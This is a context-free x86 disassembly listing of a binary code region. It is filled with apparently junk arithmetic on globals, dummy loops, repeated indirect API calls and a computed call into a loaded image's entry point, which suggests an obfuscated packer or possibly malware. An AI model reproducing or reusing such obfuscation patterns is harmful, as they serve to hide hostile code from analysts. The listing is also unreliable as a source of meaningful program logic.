  423d56:	mov    ds:0x429516,eax
  423d5b:	and    DWORD PTR ds:0x42a2ce,0x0
  423d65:	xor    eax,eax
  423d67:	xor    eax,DWORD PTR ds:0x42a2ce
  423d6d:	inc    eax
  423d6e:	mov    ds:0x42a2ce,eax
  423d73:	cmp    DWORD PTR ds:0x42a2ce,0x10
  423d7a:	jg     0x423dc0
  423d80:	jmp    0x423d9b
  423d85:	push   DWORD PTR [ebp-0x18]
  423d88:	push   0x42a2b6
  423d8d:	push   DWORD PTR [ebp-0x10]
  423d90:	push   0x4828
  423d95:	call   DWORD PTR ds:0x42a3d2
  423d9b:	cmp    DWORD PTR ds:0x42a2ce,0xf
  423da2:	jne    0x423db3
  423da8:	mov    eax,ds:0x42a2ce
  423dad:	inc    eax
  423dae:	mov    ds:0x42a2ce,eax
  423db3:	cmp    DWORD PTR ds:0x42a2ce,0x1a
  423dba:	jb     0x423d65
  423dc0:	mov    eax,ds:0x42941e
  423dc5:	mov    eax,DWORD PTR [eax+0x18c]
  423dcb:	add    DWORD PTR ds:0x42a28e,0x42a292
  423dd5:	mov    eax,DWORD PTR [eax]
  423dd7:	neg    DWORD PTR ds:0x42a302
  423ddd:	mov    DWORD PTR [esp+0x60],eax
  423de1:	xor    eax,eax
  423de3:	xor    eax,DWORD PTR ds:0x42a27a
  423de9:	xor    eax,DWORD PTR ds:0x42a266
  423def:	mov    ds:0x42a27a,eax
  423df4:	mov    eax,0xf89c85b9
  423df9:	mov    DWORD PTR [esp+0x18],eax
  423dfd:	mov    DWORD PTR [esp+0x18],eax
  423e01:	and    DWORD PTR ds:0x42a2ae,0xe84
  423e0b:	mov    DWORD PTR [esp+0x18],eax
  423e0f:	sub    DWORD PTR ds:0x42a2ce,0x42a2d6
  423e19:	mov    DWORD PTR [esp+0x18],0xf89c85a5
  423e21:	adc    DWORD PTR ds:0x42a2f2,0x42a29a
  423e2b:	mov    DWORD PTR [esp+0x10],eax
  423e2f:	xor    eax,0x48fc
  423e34:	mov    DWORD PTR [esp+0x10],0xf89c85bd
  423e3c:	mov    eax,DWORD PTR [esp+0x20]
  423e40:	add    DWORD PTR ds:0x42a2fa,0x42a25e
  423e4a:	xor    eax,edi
  423e4c:	sub    DWORD PTR ds:0x42a29a,0x2bd1
  423e56:	add    eax,ebx
  423e58:	mov    DWORD PTR ds:0x42a276,0x6294
  423e62:	jmp    0x4240a6
  423e67:	lea    eax,[esp+0x78]
  423e6b:	push   eax
  423e6c:	dec    DWORD PTR ds:0x42a292
  423e72:	push   0x4295b2
  423e77:	adc    DWORD PTR ds:0x42a2fa,0x42a2de
  423e81:	call   DWORD PTR ds:0x42a3c6
  423e87:	mov    DWORD PTR ds:0x42a262,0x2f3f
  423e91:	cmp    eax,0xffffffff
  423e94:	jne    0x423a3b
  423e9a:	add    DWORD PTR ds:0x42a2da,0x42a2d2
  423ea4:	push   0xf
  423ea6:	and    DWORD PTR ds:0x42a2ce,0x42a27e
  423eb0:	lea    eax,[esp+0x44]
  423eb4:	push   eax
  423eb5:	push   0x429606
  423eba:	push   0x42961a
  423ebf:	push   0x42963a
  423ec4:	call   esi
  423ec6:	or     DWORD PTR ds:0x42a2fa,0x3e60
  423ed0:	imul   eax,eax,0x300000
  423ed6:	mov    DWORD PTR ds:0x42a2ae,0x6f02
  423ee0:	cmp    eax,0x1b00000
  423ee5:	mov    DWORD PTR ds:0x42a256,0x6c6e
  423eef:	jne    0x423a3b
  423ef5:	or     DWORD PTR ds:0x42a2ea,0x2c5c
  423eff:	lea    eax,[esp+0x1b8]
  423f06:	push   eax
  423f07:	push   0x429676
  423f0c:	add    DWORD PTR ds:0x42a2de,0x42a26e
  423f16:	call   DWORD PTR ds:0x42a3e6
  423f1c:	mov    DWORD PTR ds:0x42a27e,0xb7
  423f26:	cmp    eax,0xffffffff
  423f29:	mov    DWORD PTR ds:0x42a29a,0x2154
  423f33:	jne    0x423a3b
  423f39:	xor    DWORD PTR ds:0x42a2ae,0x154c
  423f43:	mov    eax,DWORD PTR [esp+0xc]
  423f47:	mov    DWORD PTR ds:0x42a26e,0x11
  423f51:	cmp    DWORD PTR ds:0x42a26e,0x0
  423f58:	je     0x423fa3
  423f5e:	cmp    DWORD PTR ds:0x42a26e,0x12
  423f65:	jge    0x423fa3
  423f6b:	jmp    0x423f91
  423f70:	push   DWORD PTR [ebp-0x28]
  423f73:	push   DWORD PTR [ebp-0x24]
  423f76:	push   DWORD PTR [ebp-0x24]
  423f79:	push   0x7e73
  423f7e:	push   DWORD PTR [ebp-0x18]
  423f81:	push   0x85b3
  423f86:	push   0x429247
  423f8b:	call   DWORD PTR ds:0x42a3d6
  423f91:	mov    ecx,DWORD PTR ds:0x42a26e
  423f97:	dec    ecx
  423f98:	mov    DWORD PTR ds:0x42a26e,ecx
  423f9e:	jmp    0x423f51
  423fa3:	mov    ecx,DWORD PTR [esp+0x10]
  423fa7:	adc    DWORD PTR ds:0x42a2ae,0x42a2d2
  423fb1:	xor    eax,edi
  423fb3:	lea    eax,[eax+ecx*1+0x3272f1]
  423fba:	push   eax
  423fbb:	and    DWORD PTR ds:0x42a2ea,0x0
  423fc5:	mov    eax,ds:0x42a2ea
  423fca:	inc    eax
  423fcb:	mov    ds:0x42a2ea,eax
  423fd0:	cmp    DWORD PTR ds:0x42a2ea,0x26
  423fd7:	jbe    0x423ff5
  423fdd:	jmp    0x423fe8
  423fe2:	call   DWORD PTR ds:0x42a3da
  423fe8:	cmp    DWORD PTR ds:0x42a2ea,0x1a
  423fef:	jb     0x423fc5
  423ff5:	mov    eax,DWORD PTR [esp+0x1c]
  423ff9:	sbb    DWORD PTR ds:0x42a2aa,0x42a2be
  424003:	xor    eax,edi
  424005:	lea    eax,[ebp+eax*1+0x3272f9]
  42400c:	push   eax
  42400d:	mov    eax,ds:0x42941e
  424012:	push   DWORD PTR [eax+0x1bc]
  424018:	sub    DWORD PTR ds:0x42a2ea,0x42a286
  424022:	call   0x424ca7
  424027:	mov    eax,DWORD PTR [esp+0xc]
  42402b:	mov    ecx,DWORD PTR [esp+0x10]
  42402f:	and    DWORD PTR ds:0x42a2aa,0x0
  424039:	mov    edx,DWORD PTR ds:0x42a2aa
  42403f:	inc    edx
  424040:	mov    DWORD PTR ds:0x42a2aa,edx
  424046:	cmp    DWORD PTR ds:0x42a2aa,0x9
  42404d:	jg     0x424097
  424053:	jmp    0x42406e
  424058:	push   DWORD PTR [ebp-0x10]
  42405b:	push   0x1529
  424060:	push   DWORD PTR [ebp-0x28]
  424063:	push   0x155a
  424068:	call   DWORD PTR ds:0x42a3de
  42406e:	cmp    DWORD PTR ds:0x42a2aa,0x8
  424075:	jne    0x42408a
  42407b:	xor    edx,edx
  42407d:	or     edx,DWORD PTR ds:0x42a2aa
  424083:	inc    edx
  424084:	mov    DWORD PTR ds:0x42a2aa,edx
  42408a:	cmp    DWORD PTR ds:0x42a2aa,0x1e
  424091:	jb     0x424039
  424097:	xor    eax,edi
  424099:	adc    DWORD PTR ds:0x42a256,ebx
  42409f:	lea    eax,[ecx+eax*1+0x3272f1]
  4240a6:	movzx  ecx,WORD PTR ds:0x42a2a6
  4240ad:	xor    DWORD PTR ds:0x42a29e,ecx
  4240b3:	mov    ecx,DWORD PTR [esp+0xc]
  4240b7:	mov    edx,DWORD PTR [esp+0xc]
  4240bb:	adc    DWORD PTR ds:0x42a2b6,0x42a2ee
  4240c5:	xor    edx,edi
  4240c7:	xor    ecx,edi
  4240c9:	add    ecx,edx
  4240cb:	mov    edx,DWORD PTR [esp+0xc]
  4240cf:	xor    edx,edi
  4240d1:	lea    ecx,[ecx+edx*1+0x9758d3]
  4240d8:	mov    DWORD PTR ds:0x42a2ea,0x175a
  4240e2:	mov    DWORD PTR [esp+0x10],eax
  4240e6:	mov    DWORD PTR ds:0x42a28e,0x2b18
  4240f0:	cmp    eax,ecx
  4240f2:	jbe    0x423e67
  4240f8:	or     ecx,DWORD PTR ds:0x42a286
  4240fe:	mov    eax,DWORD PTR [ebp+0xc]
  424101:	mov    ds:0x4292a2,eax
  424106:	mov    eax,DWORD PTR [ebp+0x10]
  424109:	and    DWORD PTR ds:0x42a2c2,0x0
  424113:	jmp    0x424127
  424118:	xor    ecx,ecx
  42411a:	xor    ecx,DWORD PTR ds:0x42a2c2
  424120:	inc    ecx
  424121:	mov    DWORD PTR ds:0x42a2c2,ecx
  424127:	cmp    DWORD PTR ds:0x42a2c2,0x1b
  42412e:	jae    0x424151
  424134:	cmp    DWORD PTR ds:0x42a2c2,0x29
  42413b:	jle    0x424151
  424141:	jmp    0x42414c
  424146:	call   DWORD PTR ds:0x42a3e2
  42414c:	jmp    0x424118
  424151:	mov    ds:0x4294fe,eax
  424156:	xor    ecx,eax
  424158:	mov    eax,ds:0x4292a2
  42415d:	and    ecx,0x3395
  424163:	mov    ecx,DWORD PTR [esp+0x30]
  424167:	add    DWORD PTR ds:0x42a2c2,0x886
  424171:	sub    eax,ebx
  424173:	adc    DWORD PTR ds:0x42a2c2,0x4089
  42417d:	xor    eax,edi
  42417f:	sub    DWORD PTR ds:0x42a2b6,0x2768
  424189:	mov    DWORD PTR [ecx],eax
  42418b:	and    DWORD PTR ds:0x42a2aa,0x51d9
  424195:	lea    eax,[esp+0x2c]
  424199:	mov    DWORD PTR [esp+0x6c],eax
  42419d:	lea    eax,[ebp+0x4]
  4241a0:	mov    DWORD PTR [esp+0x2c],eax
  4241a4:	xor    DWORD PTR ds:0x42a2da,0x6aa
  4241ae:	lea    eax,[esp+0x78]
  4241b2:	sub    DWORD PTR ds:0x42a266,0x42a2ba
  4241bc:	push   eax
  4241bd:	push   0x429662
  4241c2:	sub    DWORD PTR ds:0x42a25e,0x6538
  4241cc:	call   DWORD PTR ds:0x42a3c6
  4241d2:	mov    DWORD PTR ds:0x42a2aa,0x7d87
  4241dc:	cmp    eax,0xffffffff
  4241df:	jne    0x423a3b
  4241e5:	push   0xf
  4241e7:	lea    eax,[esp+0x44]
  4241eb:	push   eax
  4241ec:	and    DWORD PTR ds:0x42a302,0x42a2e2
  4241f6:	push   0x4296b6
  4241fb:	sub    DWORD PTR ds:0x42a2d2,0x1a40
  424205:	push   0x4296ca
  42420a:	adc    DWORD PTR ds:0x42a302,0xcfc
  424214:	push   0x4296ea
  424219:	add    DWORD PTR ds:0x42a292,0x42a286
  424223:	call   esi
  424225:	xor    DWORD PTR ds:0x42a2aa,0x42a302
  42422f:	imul   eax,eax,0x300000
  424235:	cmp    eax,0x1b00000
  42423a:	mov    DWORD PTR ds:0x42a2d6,0x3d32
  424244:	jne    0x423a3b
  42424a:	lea    eax,[esp+0x1b8]
  424251:	adc    DWORD PTR ds:0x42a29a,0x42a2c6
  42425b:	push   eax
  42425c:	and    DWORD PTR ds:0x42a2ea,0x7bce
  424266:	push   0x429726
  42426b:	xor    DWORD PTR ds:0x42a2d2,0x75c
  424275:	call   DWORD PTR ds:0x42a3e6
  42427b:	cmp    eax,0xffffffff
  42427e:	mov    DWORD PTR ds:0x42a2d6,0x39fb
  424288:	jne    0x423a3b
  42428e:	sbb    DWORD PTR ds:0x42a2ea,0x7658
  424298:	lea    eax,[esp+0x78]
  42429c:	push   eax
  42429d:	push   0x429712
  4242a2:	call   DWORD PTR ds:0x42a3c6
  4242a8:	cmp    eax,0xffffffff
  4242ab:	mov    DWORD PTR ds:0x42a27a,0x74cc
  4242b5:	jne    0x423a3b
  4242bb:	adc    DWORD PTR ds:0x42a2be,0x42a2e2
  4242c5:	push   0xf
  4242c7:	and    DWORD PTR ds:0x42a272,0x42a2d6
  4242d1:	lea    eax,[esp+0x44]
  4242d5:	xor    DWORD PTR ds:0x42a2da,0x20f3
  4242df:	push   eax
  4242e0:	sub    DWORD PTR ds:0x42a2f2,0x57ed
  4242ea:	push   0x429766
  4242ef:	push   0x42977a
  4242f4:	push   0x42979a
  4242f9:	sbb    DWORD PTR ds:0x42a272,0x42a302
  424303:	call   esi
  424305:	imul   eax,eax,0x300000
  42430b:	cmp    eax,0x1b00000
  424310:	mov    DWORD PTR ds:0x42a2ea,0x7ab0
  42431a:	jne    0x423a3b
  424320:	and    DWORD PTR ds:0x42a2e6,0x42a29a
  42432a:	lea    eax,[esp+0x1b8]
  424331:	neg    DWORD PTR ds:0x42a26e
  424337:	push   eax
  424338:	push   0x4297d6
  42433d:	xor    DWORD PTR ds:0x42a28e,0x42a2c2
  424347:	call   DWORD PTR ds:0x42a3e6
  42434d:	mov    DWORD PTR ds:0x42a292,0x73e5
  424357:	cmp    eax,0xffffffff
  42435a:	jne    0x423a3b
  424360:	lea    eax,[esp+0x78]
  424364:	xor    DWORD PTR ds:0x42a2ea,0x42a256
  42436e:	push   eax
  42436f:	and    DWORD PTR ds:0x42a28e,0x42a256
  424379:	push   0x4297c2
  42437e:	sub    DWORD PTR ds:0x42a26e,0xb4e
  424388:	call   DWORD PTR ds:0x42a3c6
  42438e:	mov    DWORD PTR ds:0x42a292,0x325f
  424398:	cmp    eax,0xffffffff
  42439b:	mov    DWORD PTR ds:0x42a2d2,0x412a
  4243a5:	jne    0x423a3b
  4243ab:	adc    DWORD PTR ds:0x42a28a,0x42a27a
  4243b5:	push   0xf
  4243b7:	lea    eax,[esp+0x44]
  4243bb:	push   eax
  4243bc:	adc    DWORD PTR ds:0x42a28a,0x1e7a
  4243c6:	push   0x429816
  4243cb:	sub    DWORD PTR ds:0x42a2aa,0xfe
  4243d5:	push   0x42982a
  4243da:	sub    DWORD PTR ds:0x42a27e,0x1b5
  4243e4:	push   0x42984a
  4243e9:	adc    DWORD PTR ds:0x42a28e,0x2d72
  4243f3:	call   esi
  4243f5:	imul   eax,eax,0x300000
  4243fb:	cmp    eax,0x1b00000
  424400:	mov    DWORD PTR ds:0x42a28e,0x482a
  42440a:	jne    0x423a3b
  424410:	sub    DWORD PTR ds:0x42a25a,0x42a2ba
  42441a:	lea    eax,[esp+0x1b8]
  424421:	push   eax
  424422:	adc    DWORD PTR ds:0x42a28e,0x42a2da
  42442c:	push   0x429886
  424431:	xor    DWORD PTR ds:0x42a26e,0x42a29a
  42443b:	call   DWORD PTR ds:0x42a3e6
  424441:	mov    DWORD PTR ds:0x42a2ca,0x1025
  42444b:	cmp    eax,0xffffffff
  42444e:	jne    0x423a3b
  424454:	xor    DWORD PTR ds:0x42a2c2,0x449b
  42445e:	lea    eax,[esp+0x78]
  424462:	push   eax
  424463:	push   0x429872
  424468:	and    DWORD PTR ds:0x42a27a,0x42a2fa
  424472:	call   DWORD PTR ds:0x42a3c6
  424478:	mov    DWORD PTR ds:0x42a2fa,0x2004
  424482:	cmp    eax,0xffffffff
  424485:	mov    DWORD PTR ds:0x42a296,0x62c6
  42448f:	jne    0x423a3b
  424495:	and    DWORD PTR ds:0x42a2de,0x5eb4
  42449f:	push   0xf
  4244a1:	adc    DWORD PTR ds:0x42a28a,0x4918
  4244ab:	lea    eax,[esp+0x44]
  4244af:	or     DWORD PTR ds:0x42a2a6,0x42a25e
  4244b9:	push   eax
  4244ba:	sbb    DWORD PTR ds:0x42a2a2,0x42a262
  4244c4:	push   0x4298c6
  4244c9:	xor    DWORD PTR ds:0x42a2d2,0x1d8b
  4244d3:	push   0x4298da
  4244d8:	and    DWORD PTR ds:0x42a2b6,0x42a302
  4244e2:	push   0x4298fa
  4244e7:	not    DWORD PTR ds:0x42a2d2
  4244ed:	call   esi
  4244ef:	imul   eax,eax,0x300000
  4244f5:	cmp    eax,0x1b00000
  4244fa:	mov    DWORD PTR ds:0x42a292,0xbee
  424504:	jne    0x423a3b
  42450a:	xor    DWORD PTR ds:0x42a266,0x42a2c6
  424514:	lea    eax,[esp+0x1b8]
  42451b:	push   eax
  42451c:	or     DWORD PTR ds:0x42a2be,0x2cef
  424526:	push   0x429936
  42452b:	call   DWORD PTR ds:0x42a3e6
  424531:	cmp    eax,0xffffffff
  424534:	mov    DWORD PTR ds:0x42a2b6,0x6b51
  42453e:	jne    0x423a3b
  424544:	sub    DWORD PTR ds:0x42a276,0x363f
  42454e:	lea    eax,[esp+0x78]
  424552:	add    DWORD PTR ds:0x42a29e,0x42a302
  42455c:	push   eax
  42455d:	push   0x429922
  424562:	adc    DWORD PTR ds:0x42a27a,0x42a2c6
  42456c:	call   DWORD PTR ds:0x42a3c6
  424572:	cmp    eax,0xffffffff
  424575:	jne    0x423a3b
  42457b:	or     DWORD PTR ds:0x42a292,0x4d8b
  424585:	push   0xf
  424587:	or     DWORD PTR ds:0x42a2c6,0x42a2d2
  424591:	lea    eax,[esp+0x44]
  424595:	push   eax
  424596:	adc    DWORD PTR ds:0x42a2a6,0x7f91
  4245a0:	push   0x429976
  4245a5:	and    DWORD PTR ds:0x42a28e,0x42a27e
  4245af:	push   0x42998a
  4245b4:	push   0x4299aa
  4245b9:	call   esi
  4245bb:	or     DWORD PTR ds:0x42a2d6,0x5541
  4245c5:	imul   eax,eax,0x300000
  4245cb:	mov    DWORD PTR ds:0x42a292,0x284d
  4245d5:	cmp    eax,0x1b00000
  4245da:	mov    DWORD PTR ds:0x42a302,0x32eb
  4245e4:	jne    0x423a3b
  4245ea:	adc    DWORD PTR ds:0x42a2ee,0x651e
  4245f4:	lea    eax,[esp+0x1b8]
  4245fb:	push   eax
  4245fc:	and    DWORD PTR ds:0x42a286,0x42a2f2
  424606:	push   0x4299e6
  42460b:	sub    DWORD PTR ds:0x42a2ee,0x3d63
  424615:	call   DWORD PTR ds:0x42a3e6
  42461b:	mov    DWORD PTR ds:0x42a2a2,0x1646
  424625:	cmp    eax,0xffffffff
  424628:	jne    0x423a3b
  42462e:	adc    DWORD PTR ds:0x42a286,0x29d1
  424638:	lea    eax,[esp+0x78]
  42463c:	push   eax
  42463d:	sbb    DWORD PTR ds:0x42a25a,0x42a26e
  424647:	push   0x4299d2
  42464c:	adc    DWORD PTR ds:0x42a28a,0x42a2ae
  424656:	call   DWORD PTR ds:0x42a3c6
  42465c:	cmp    eax,0xffffffff
  42465f:	jne    0x423a3b
  424665:	push   0xf
  424667:	mov    DWORD PTR ds:0x42a2da,0x5dc8
  424671:	lea    eax,[esp+0x44]
  424675:	add    DWORD PTR ds:0x42a2a6,0x42a2b6
  42467f:	push   eax
  424680:	not    DWORD PTR ds:0x42a25e
  424686:	push   0x429a26
  42468b:	push   0x429a3a
  424690:	or     DWORD PTR ds:0x42a26a,0x42a25e
  42469a:	push   0x429a5a
  42469f:	call   esi
  4246a1:	imul   eax,eax,0x300000
  4246a7:	cmp    eax,0x1b00000
  4246ac:	jne    0x423a3b
  4246b2:	lea    eax,[esp+0x1b8]
  4246b9:	push   eax
  4246ba:	push   0x429a96
  4246bf:	xor    DWORD PTR ds:0x42a286,0x22c0
  4246c9:	call   DWORD PTR ds:0x42a3e6
  4246cf:	cmp    eax,0xffffffff
  4246d2:	jne    0x423a3b
  4246d8:	xor    DWORD PTR ds:0x42a2d6,0x42a2f2
  4246e2:	lea    eax,[esp+0x78]
  4246e6:	and    DWORD PTR ds:0x42a272,0x42a2da
  4246f0:	push   eax
  4246f1:	push   0x429a82
  4246f6:	dec    DWORD PTR ds:0x42a2ae
  4246fc:	call   DWORD PTR ds:0x42a3c6
  424702:	mov    DWORD PTR ds:0x42a296,0x5803
  42470c:	cmp    eax,0xffffffff
  42470f:	mov    DWORD PTR ds:0x42a2ee,0x7cea
  424719:	jne    0x423a3b
  42471f:	xor    DWORD PTR ds:0x42a2c6,0x69dc
  424729:	push   0xf
  42472b:	add    DWORD PTR ds:0x42a302,0x59e7
  424735:	lea    eax,[esp+0x44]
  424739:	push   eax
  42473a:	push   0x429ad6
  42473f:	and    DWORD PTR ds:0x42a2fa,0x200e
  424749:	push   0x429aea
  42474e:	push   0x429b0a
  424753:	call   esi
  424755:	imul   eax,eax,0x300000
  42475b:	cmp    eax,0x1b00000
  424760:	mov    DWORD PTR ds:0x42a29e,0x5c25
  42476a:	jne    0x423a3b
  424770:	sbb    DWORD PTR ds:0x42a2ce,0x42a2d6
  42477a:	lea    eax,[esp+0x1b8]
  424781:	xor    DWORD PTR ds:0x42a2a2,0x42a2aa
  42478b:	push   eax
  42478c:	push   0x429b46
  424791:	or     DWORD PTR ds:0x42a266,0x3d87
  42479b:	call   DWORD PTR ds:0x42a3e6
  4247a1:	mov    DWORD PTR ds:0x42a2ca,0x3132
  4247ab:	cmp    eax,0xffffffff
  4247ae:	jne    0x423a3b
  4247b4:	lea    eax,[esp+0x78]
  4247b8:	push   eax
  4247b9:	push   0x429b32
  4247be:	call   DWORD PTR ds:0x42a3c6
  4247c4:	cmp    eax,0xffffffff
  4247c7:	jne    0x423a3b
  4247cd:	push   0xf
  4247cf:	lea    eax,[esp+0x44]
  4247d3:	push   eax
  4247d4:	push   0x429b86
  4247d9:	push   0x429b9a
  4247de:	push   0x429bba
  4247e3:	call   esi
  4247e5:	imul   eax,eax,0x300000
  4247eb:	cmp    eax,0x1b00000
  4247f0:	jne    0x423a3b
  4247f6:	lea    eax,[esp+0x1b8]
  4247fd:	push   eax
  4247fe:	push   0x429bf6
  424803:	call   DWORD PTR ds:0x42a3e6
  424809:	cmp    eax,0xffffffff
  42480c:	jne    0x423a3b
  424812:	lea    eax,[esp+0x78]
  424816:	push   eax
  424817:	push   0x429be2
  42481c:	call   DWORD PTR ds:0x42a3c6
  424822:	cmp    eax,0xffffffff
  424825:	jne    0x423a3b
  42482b:	push   0xf
  42482d:	lea    eax,[esp+0x44]
  424831:	push   eax
  424832:	push   0x429c36
  424837:	push   0x429c4a
  42483c:	push   0x429c6a
  424841:	call   esi
  424843:	imul   eax,eax,0x300000
  424849:	cmp    eax,0x1b00000
  42484e:	jne    0x423a3b
  424854:	lea    eax,[esp+0x1b8]
  42485b:	push   eax
  42485c:	push   0x429ca6
  424861:	call   DWORD PTR ds:0x42a3e6
  424867:	cmp    eax,0xffffffff
  42486a:	jne    0x423a3b
  424870:	lea    eax,[esp+0x78]
  424874:	push   eax
  424875:	push   0x429c92
  42487a:	call   DWORD PTR ds:0x42a3c6
  424880:	cmp    eax,0xffffffff
  424883:	jne    0x423a3b
  424889:	push   0xf
  42488b:	lea    eax,[esp+0x44]
  42488f:	push   eax
  424890:	push   0x429ce6
  424895:	push   0x429cfa
  42489a:	push   0x429d1a
  42489f:	call   esi
  4248a1:	imul   eax,eax,0x300000
  4248a7:	cmp    eax,0x1b00000
  4248ac:	jne    0x423a3b
  4248b2:	lea    eax,[esp+0x1b8]
  4248b9:	push   eax
  4248ba:	push   0x429d56
  4248bf:	call   DWORD PTR ds:0x42a3e6
  4248c5:	cmp    eax,0xffffffff
  4248c8:	jne    0x423a3b
  4248ce:	lea    eax,[esp+0x78]
  4248d2:	push   eax
  4248d3:	push   0x429d42
  4248d8:	call   DWORD PTR ds:0x42a3c6
  4248de:	cmp    eax,0xffffffff
  4248e1:	jne    0x423a3b
  4248e7:	push   0xf
  4248e9:	lea    eax,[esp+0x44]
  4248ed:	push   eax
  4248ee:	push   0x429d96
  4248f3:	push   0x429daa
  4248f8:	push   0x429dca
  4248fd:	call   esi
  4248ff:	imul   eax,eax,0x300000
  424905:	cmp    eax,0x1b00000
  42490a:	jne    0x423a3b
  424910:	lea    eax,[esp+0x1b8]
  424917:	push   eax
  424918:	push   0x429e06
  42491d:	call   DWORD PTR ds:0x42a3e6
  424923:	cmp    eax,0xffffffff
  424926:	jne    0x423a3b
  42492c:	lea    eax,[esp+0x78]
  424930:	push   eax
  424931:	push   0x429df2
  424936:	call   DWORD PTR ds:0x42a3c6
  42493c:	cmp    eax,0xffffffff
  42493f:	jne    0x423a3b
  424945:	push   0xf
  424947:	lea    eax,[esp+0x44]
  42494b:	push   eax
  42494c:	push   0x429e46
  424951:	push   0x429e5a
  424956:	push   0x429e7a
  42495b:	call   esi
  42495d:	imul   eax,eax,0x300000
  424963:	cmp    eax,0x1b00000
  424968:	jne    0x423a3b
  42496e:	lea    eax,[esp+0x1b8]
  424975:	push   eax
  424976:	push   0x429eb6
  42497b:	call   DWORD PTR ds:0x42a3e6
  424981:	cmp    eax,0xffffffff
  424984:	jne    0x423a3b
  42498a:	mov    eax,DWORD PTR [esp+0x3c]
  42498e:	cmp    eax,0xf89c85ba
  424993:	je     0x4249f2
  424999:	mov    eax,DWORD PTR [esp+0x20]
  42499d:	mov    ecx,DWORD PTR [esp+0x38]
  4249a1:	xor    eax,edi
  4249a3:	add    eax,ebx
  4249a5:	cmp    eax,ecx
  4249a7:	je     0x4249f2
  4249ad:	mov    eax,ds:0x42941e
  4249b2:	mov    eax,DWORD PTR [eax+0x194]
  4249b8:	mov    ecx,DWORD PTR [eax]
  4249ba:	mov    eax,DWORD PTR [ecx+0x3c]
  4249bd:	push   DWORD PTR ds:0x4294fe
  4249c3:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4249c7:	push   DWORD PTR ds:0x4292a2
  4249cd:	add    eax,ecx
  4249cf:	mov    ecx,DWORD PTR ds:0x42941e
  4249d5:	mov    ecx,DWORD PTR [ecx+0x194]
  4249db:	push   DWORD PTR [ecx]
  4249dd:	call   eax
  4249df:	mov    ecx,DWORD PTR ds:0x42941e
  4249e5:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4249eb:	mov    DWORD PTR [ecx],eax
  4249ed:	jmp    0x424c1f
  4249f2:	mov    eax,DWORD PTR [esp+0x20]
  4249f6:	mov    ecx,DWORD PTR [esp+0x60]
  4249fa:	xor    eax,edi
  4249fc:	add    eax,ebx
  4249fe:	cmp    eax,ecx
  424a00:	jne    0x424a69
  424a06:	mov    eax,DWORD PTR [esp+0x20]
  424a0a:	mov    ecx,DWORD PTR ds:0x42941e
  424a10:	mov    ecx,DWORD PTR [ecx+0x198]
  424a16:	xor    eax,edi
  424a18:	add    eax,ebx
  424a1a:	cmp    eax,DWORD PTR [ecx]
  424a1c:	jne    0x424a42
  424a22:	mov    eax,DWORD PTR [esp+0x20]
  424a26:	push   0xf89c85a5
  424a2b:	xor    eax,edi
  424a2d:	add    eax,ebx
  424a2f:	push   eax
  424a30:	push   0xf89c85b9
  424a35:	push   DWORD PTR [esp+0x18]
  424a39:	push   DWORD PTR [esp+0x30]
  424a3d:	call   0x423323
  424a42:	push   DWORD PTR [esp+0xc]
  424a46:	push   DWORD PTR [esp+0x24]
  424a4a:	call   0x401000
  424a4f:	mov    eax,DWORD PTR [esp+0x20]
  424a53:	xor    eax,edi
  424a55:	add    eax,ebx
  424a57:	mov    ds:0x4294aa,eax
  424a5c:	mov    eax,DWORD PTR [esp+0x20]
  424a60:	xor    eax,edi
  424a62:	add    eax,ebx
  424a64:	mov    ds:0x4294a2,eax
  424a69:	mov    eax,DWORD PTR [esp+0x2c]
  424a6d:	test   eax,eax
  424a6f:	je     0x424c1f
  424a75:	lea    eax,[esp+0x78]
  424a79:	mov    DWORD PTR [esp+0x64],0xf152c32
  424a81:	push   eax
  424a82:	mov    DWORD PTR [esp+0x78],0x712ed2f
  424a8a:	mov    DWORD PTR [esp+0x74],0x373fc0d
  424a92:	push   0x429ea2
  424a97:	mov    DWORD PTR [esp+0x70],0x72670add
  424a9f:	call   DWORD PTR ds:0x42a3c6
  424aa5:	cmp    eax,0xffffffff
  424aa8:	jne    0x423a3b
  424aae:	push   0xf
  424ab0:	lea    eax,[esp+0x44]
  424ab4:	push   eax
  424ab5:	push   0x429ef6
  424aba:	push   0x429f0a
  424abf:	push   0x429f2a
  424ac4:	call   esi
  424ac6:	imul   eax,eax,0x300000
  424acc:	cmp    eax,0x1b00000
  424ad1:	jne    0x423a3b
  424ad7:	lea    eax,[esp+0x1b8]
  424ade:	push   eax
  424adf:	push   0x429f66
  424ae4:	call   DWORD PTR ds:0x42a3e6
  424aea:	cmp    eax,0xffffffff
  424aed:	jne    0x423a3b
  424af3:	call   0x422fa8
  424af8:	mov    eax,DWORD PTR [esp+0x34]
  424afc:	mov    eax,DWORD PTR [esp+0xc]
  424b00:	mov    DWORD PTR [esp+0x30],eax
  424b04:	mov    eax,DWORD PTR [esp+0x20]
  424b08:	mov    DWORD PTR [esp+0xc],eax
  424b0c:	mov    eax,eax
  424b0e:	mov    eax,ds:0x42941e
  424b13:	mov    ecx,DWORD PTR [eax+0x1c0]
  424b19:	mov    edx,DWORD PTR [ecx]
  424b1b:	and    DWORD PTR [esp+0x1c],0x0
  424b20:	mov    esi,0xfabdbed8
  424b25:	add    edx,esi
  424b27:	adc    DWORD PTR [esp+0x1c],0xffffffff
  424b2c:	mov    ecx,0x8a29a13d
  424b31:	xor    edx,ecx
  424b33:	mov    DWORD PTR [esp+0x10],edx
  424b37:	mov    edx,DWORD PTR [esp+0x1c]
  424b3b:	xor    edx,0x0
  424b3e:	cmp    DWORD PTR [esp+0x10],0x70941fe4
  424b46:	mov    DWORD PTR [esp+0x14],edx
  424b4a:	jne    0x424b59
  424b50:	cmp    edx,0xffffffff
  424b53:	je     0x424bc2
  424b59:	mov    eax,DWORD PTR [eax+0x1c8]
  424b5f:	mov    eax,DWORD PTR [eax]
  424b61:	cdq    
  424b62:	add    eax,esi
  424b64:	adc    edx,0xffffffff
  424b67:	and    DWORD PTR [esp+0x1c],0x0
  424b6c:	xor    edx,0x0
  424b6f:	mov    DWORD PTR [esp+0x24],edx
  424b73:	mov    edx,DWORD PTR [esp+0xc]
  424b77:	mov    DWORD PTR [esp+0x18],edx
  424b7b:	xor    eax,ecx
  424b7d:	add    DWORD PTR [esp+0x18],esi
  424b81:	mov    edx,DWORD PTR [esp+0x18]
  424b85:	adc    DWORD PTR [esp+0x1c],0xffffffff
  424b8a:	xor    edx,ecx
  424b8c:	mov    DWORD PTR [esp+0x10],edx
  424b90:	mov    edx,DWORD PTR [esp+0x1c]
  424b94:	xor    edx,0x0
  424b97:	mov    DWORD PTR [esp+0x14],edx
